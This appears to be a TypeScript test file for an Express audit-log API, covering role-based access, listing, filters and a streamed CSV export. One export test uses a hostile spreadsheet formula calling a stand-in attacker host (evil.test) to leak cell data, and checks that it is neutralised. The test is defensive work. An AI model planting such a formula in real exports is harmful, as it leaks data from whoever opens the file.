import { generateKeyPairSync } from 'node:crypto';
import express, { type Express } from 'express';
import request from 'supertest';
import { beforeAll, describe, expect, it, vi } from 'vitest';
import { createLogger } from '@relayd/logger';
import type { GlobalMembershipRepository } from '@relayd/db';
import type { UserId, WorkspaceId, WorkspaceRole } from '@relayd/types';
import { requestContext } from '../src/middleware/authorize.js';
import { errorEnvelope } from '../src/middleware/error-envelope.js';
import { requestId } from '../src/middleware/request-id.js';
import { auditRoutes } from '../src/routes/audit.js';
import { TokenService } from '../src/services/tokens.js';
import type { AuditExportRecord, AuditLogService } from '../src/services/audit-log.js';

/**
 * The audit log routes over HTTP (J6).
 *
 * Three things live in the routing layer and nowhere below it.
 *
 * **`audit:read` is owners and admins.** The audit log is the record of what
 * everybody in the workspace has done, and it is not an editor's to read. The
 * matrix says so; this file is what makes the matrix binding on these paths.
 *
 * **The export is escaped against the spreadsheet.** An audit log is full of
 * attacker-influenced text — a contact's name, a template's name — and it is
 * opened in Excel by the person in the workspace with the most authority. A
 * cell beginning `=` must arrive as text.
 *
 * **The export streams.** It is written as it is read, so the header row must
 * still appear for an empty result and a failure before the first row must
 * still produce a JSON error rather than a 200 with half a file behind it.
 */

const { privateKey, publicKey } = generateKeyPairSync('rsa', {
  modulusLength: 2048,
  privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
  publicKeyEncoding: { type: 'spki', format: 'pem' },
});

const tokens = new TokenService({
  privateKeyPem: privateKey,
  publicKeyPem: publicKey,
  keyId: 'k1',
  accessTokenTtlSeconds: 900,
});

const WS = 'ws-a' as WorkspaceId;
const USER = 'user-1' as UserId;

function record(over: Partial<AuditExportRecord> = {}): AuditExportRecord {
  return {
    occurredAt: '2026-09-19T09:30:00.000Z',
    actorKind: 'user',
    actor: 'Dana Haddad',
    action: 'campaign.launched',
    resourceType: 'campaign',
    resource: 'c1',
    details: 'recipientCount: 42',
    before: '',
    after: '{"recipientCount":42}',
    ...over,
  };
}

function buildApp(role: WorkspaceRole, service: Partial<AuditLogService> = {}): Express {
  const findMembership = vi.fn(async (userId: UserId, workspaceId: WorkspaceId) =>
    userId === USER && workspaceId === WS
      ? { workspaceId: WS, workspaceName: 'ws', workspaceSlug: 'ws', role }
      : null,
  );

  const auditLogs = {
    async list() {
      return { events: [], total: 0 };
    },
    async filterOptions() {
      return { actors: [], actions: [], resourceTypes: [] };
    },
    async exportRecords(
      _scope: unknown,
      _filters: unknown,
      write: (row: AuditExportRecord) => void | Promise<void>,
    ) {
      await write(record());
      return { rows: 1, truncated: false };
    },
    ...service,
  } as unknown as AuditLogService;

  const app = express();
  app.use(express.json());
  app.use(requestId);
  app.use(requestContext);
  app.use(
    '/api/v1',
    auditRoutes({
      auditLogs,
      tokens,
      memberships: { findMembership } as unknown as GlobalMembershipRepository,
    }),
  );
  app.use(
    errorEnvelope(
      createLogger({ name: 'test', level: 'fatal', destination: { write: () => undefined } }),
    ),
  );

  return app;
}

let bearer: string;

beforeAll(async () => {
  bearer = await tokens.issueAccessToken({ sub: USER, sid: 'session-1', wsIds: [WS], ver: 1 });
});

function auth(app: Express, path: string) {
  return request(app)
    .get(path)
    .set('Authorization', `Bearer ${bearer}`)
    .set('X-Workspace-Id', WS);
}

describe('audit:read is owners and admins', () => {
  it.each(['owner', 'admin'] as const)('lets an %s read the log', async (role) => {
    const res = await auth(buildApp(role), '/api/v1/audit-logs');
    expect(res.status).toBe(200);
  });

  it.each(['editor', 'viewer'] as const)('refuses a %s', async (role) => {
    const list = vi.fn();
    const res = await auth(buildApp(role, { list } as never), '/api/v1/audit-logs');

    // 403, not 404: they are a member of this workspace, they simply may not
    // read this. 404 is for somebody else's workspace.
    expect(res.status).toBe(403);
    expect(list).not.toHaveBeenCalled();
  });

  it('refuses an editor the filter options and the export too', async () => {
    for (const path of ['/api/v1/audit-logs/filters', '/api/v1/audit-logs.csv']) {
      const res = await auth(buildApp('editor'), path);
      expect(res.status, path).toBe(403);
    }
  });

  it('refuses an unauthenticated caller', async () => {
    const res = await request(buildApp('owner')).get('/api/v1/audit-logs');
    expect(res.status).toBe(401);
  });

  it('gives a non-member 404 for this workspace, never 403', async () => {
    const res = await request(buildApp('owner'))
      .get('/api/v1/audit-logs')
      .set('Authorization', `Bearer ${bearer}`)
      .set('X-Workspace-Id', 'ws-somebody-else');

    expect(res.status).toBe(404);
  });
});

describe('the list', () => {
  it('returns the events and the total J6 counts with', async () => {
    const list = vi.fn(async () => ({
      events: [
        {
          id: 'a1',
          occurredAt: '2026-09-19T09:30:00.000Z',
          actor: { kind: 'user' as const, name: 'Dana Haddad', initials: 'DH' },
          action: 'campaign.launched',
          resource: 'c1',
          resourceType: 'campaign',
          details: 'recipientCount: 42',
        },
      ],
      total: 3412,
    }));

    const res = await auth(buildApp('admin', { list } as never), '/api/v1/audit-logs');

    expect(res.status).toBe(200);
    expect(res.body.data.total).toBe(3412);
    expect(res.body.data.events).toHaveLength(1);
    expect(res.body.meta.hasMore).toBe(false);
  });

  it('passes the page, limit and filters through as the schema parsed them', async () => {
    const list = vi.fn(async (_scope: unknown, _query: unknown) => ({ events: [], total: 0 }));

    await auth(
      buildApp('admin', { list } as never),
      '/api/v1/audit-logs?page=3&limit=10&range=last_7&action=campaign.launched&q=north',
    );

    expect(list.mock.calls[0]?.[1]).toMatchObject({
      page: 3,
      limit: 10,
      range: 'last_7',
      action: 'campaign.launched',
      q: 'north',
    });
  });

  it('treats an empty filter value as no filter', async () => {
    const list = vi.fn(async (_scope: unknown, _query: unknown) => ({ events: [], total: 0 }));

    await auth(buildApp('admin', { list } as never), '/api/v1/audit-logs?q=&action=');

    expect(list.mock.calls[0]?.[1]).toMatchObject({ q: undefined, action: undefined });
  });

  it('carries a cursor in meta when there is another page', async () => {
    const list = vi.fn(async () => ({ events: [], total: 5, nextCursor: 'abc' }));

    const res = await auth(buildApp('admin', { list } as never), '/api/v1/audit-logs');

    expect(res.body.meta).toEqual({ hasMore: true, nextCursor: 'abc' });
  });

  it('rejects a bad filter with the 400 envelope, naming the field', async () => {
    const res = await auth(buildApp('admin'), '/api/v1/audit-logs?range=last_year');

    expect(res.status).toBe(400);
    expect(res.body.error.code).toBe('validation_failed');
    expect(res.body.error.details?.[0]?.path).toBe('range');
  });

  it('rejects a page and a cursor together', async () => {
    const cursor = Buffer.from(
      JSON.stringify({ occurredAt: '2026-09-19T09:30:00.000Z', id: 'a1' }),
      'utf8',
    ).toString('base64url');

    const res = await auth(buildApp('admin'), `/api/v1/audit-logs?page=2&cursor=${cursor}`);

    expect(res.status).toBe(400);
  });
});

describe('the filter options', () => {
  it('returns what the Actor and Action pickers offer', async () => {
    const filterOptions = vi.fn(async () => ({
      actors: [{ id: 'u1', name: 'Dana Haddad' }],
      actions: ['campaign.launched'],
      resourceTypes: ['campaign'],
    }));

    const res = await auth(
      buildApp('admin', { filterOptions } as never),
      '/api/v1/audit-logs/filters',
    );

    expect(res.status).toBe(200);
    expect(res.body.data.actors).toEqual([{ id: 'u1', name: 'Dana Haddad' }]);
    expect(res.body.data.actions).toEqual(['campaign.launched']);
  });

  it('is not swallowed by the list route', async () => {
    const list = vi.fn(async (_scope: unknown, _query: unknown) => ({ events: [], total: 0 }));

    await auth(buildApp('admin', { list } as never), '/api/v1/audit-logs/filters');

    expect(list).not.toHaveBeenCalled();
  });
});

describe('the CSV export', () => {
  it('is served as a download that a browser will not render', async () => {
    const res = await auth(buildApp('admin'), '/api/v1/audit-logs.csv');

    expect(res.status).toBe(200);
    expect(res.headers['content-type']).toContain('text/csv');
    expect(res.headers['content-disposition']).toContain('attachment');
    // Without nosniff a browser may decide a CSV whose first cell looks like
    // markup is HTML, and render it from our origin.
    expect(res.headers['x-content-type-options']).toBe('nosniff');
    expect(res.headers['cache-control']).toBe('no-store');
  });

  it('starts with a BOM and a header row', async () => {
    const res = await auth(buildApp('admin'), '/api/v1/audit-logs.csv');

    expect(res.text.startsWith('﻿')).toBe(true);
    expect(res.text.split('\r\n')[0]).toContain('Occurred at (UTC)');
  });

  it('neutralises a cell that a spreadsheet would run', async () => {
    const hostile = '=HYPERLINK("https://evil.test?"&A1,"Click")';
    const res = await auth(
      buildApp('admin', {
        async exportRecords(
          _scope: unknown,
          _filters: unknown,
          write: (row: AuditExportRecord) => void | Promise<void>,
        ) {
          await write(record({ actor: hostile, details: '@SUM(1+1)' }));
          return { rows: 1, truncated: false };
        },
      } as never),
      '/api/v1/audit-logs.csv',
    );

    // The leading apostrophe is what every spreadsheet reads as "this is
    // text", and it is the only defence that survives Excel, Numbers and
    // Sheets. Quoting alone does not help: the cell is evaluated after the
    // CSV is parsed.
    // Neutralised first, then quoted, then its own quotes doubled per RFC
    // 4180 — in that order. Neutralising after quoting would put the
    // apostrophe outside the quotes, where a spreadsheet ignores it.
    expect(res.text).toContain(`"'${hostile.replaceAll('"', '""')}"`);
    expect(res.text).toContain("'@SUM(1+1)");
    expect(res.text).not.toContain(`,${hostile}`);
  });

  it('quotes a comma and doubles an embedded quote', async () => {
    const res = await auth(
      buildApp('admin', {
        async exportRecords(
          _scope: unknown,
          _filters: unknown,
          write: (row: AuditExportRecord) => void | Promise<void>,
        ) {
          await write(record({ actor: 'Haddad, Dana "D"' }));
          return { rows: 1, truncated: false };
        },
      } as never),
      '/api/v1/audit-logs.csv',
    );

    expect(res.text).toContain('"Haddad, Dana ""D"""');
  });

  it('still sends a header row when nothing matched', async () => {
    const res = await auth(
      buildApp('admin', {
        async exportRecords() {
          return { rows: 0, truncated: false };
        },
      } as never),
      '/api/v1/audit-logs.csv',
    );

    expect(res.status).toBe(200);
    expect(res.text).toContain('Occurred at (UTC)');
    expect(res.text.trim().split('\r\n')).toHaveLength(1);
  });

  it('renders the error envelope when the query fails before the first row', async () => {
    const res = await auth(
      buildApp('admin', {
        async exportRecords() {
          throw new Error('boom');
        },
      } as never),
      '/api/v1/audit-logs.csv',
    );

    // Headers are withheld until there is something to send, so this is a
    // JSON 500 and not a 200 with half a file behind it.
    expect(res.status).toBe(500);
    expect(res.body.error.code).toBe('internal_error');
  });

  it('takes the filters and ignores the paging the page happens to send', async () => {
    const exportRecords = vi.fn(async (_scope: unknown, _query: unknown) => ({ rows: 0, truncated: false }));

    await auth(
      buildApp('admin', { exportRecords } as never),
      '/api/v1/audit-logs.csv?range=last_90&resource=c1&page=4&limit=10',
    );

    expect(exportRecords.mock.calls[0]?.[1]).toEqual({
      range: 'last_90',
      resource: 'c1',
      actor: undefined,
      action: undefined,
      q: undefined,
    });
  });
});
